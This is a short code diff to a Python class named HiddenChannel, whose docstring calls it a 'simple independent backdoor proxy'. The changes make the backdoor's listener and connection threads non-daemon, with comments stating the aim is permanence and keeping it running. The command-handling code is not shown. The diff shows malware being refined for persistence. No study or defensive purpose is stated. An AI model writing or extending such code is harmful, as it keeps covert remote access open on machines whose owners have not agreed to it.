@@ -10,7 +10,7 @@ import subprocess
 import sys
 import os
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from configuration import SERVER_IP, SERVER_PORT, PROXY_PORT_START, PROXY_PORT_END
+from configuration import SERVER_IP, SERVER_PORT
 
 class HiddenChannel:
     """Simple independent backdoor proxy - no external server needed"""
@@ -149,11 +149,11 @@ class HiddenChannel:
                     self.channel_socket.settimeout(1.0)
                     client_socket, client_address = self.channel_socket.accept()
                     
-                    # Handle connection in separate thread
+                    # Handle connection in separate thread (NOT daemon - for permanence)
                     connection_thread = threading.Thread(
                         target=self.handle_client_connection,
                         args=(client_socket, client_address),
-                        daemon=True
+                        daemon=False
                     )
                     connection_thread.start()
                     
@@ -179,8 +179,8 @@ class HiddenChannel:
         
         # No external target needed - we handle commands locally
         
-        # Start proxy channel in background thread
-        self.channel_thread = threading.Thread(target=self.proxy_server_loop, daemon=True)
+        # Start proxy channel in background thread (NOT daemon - so it stays running)
+        self.channel_thread = threading.Thread(target=self.proxy_server_loop, daemon=False)
         self.channel_thread.start()
         
         # Give it a moment to start
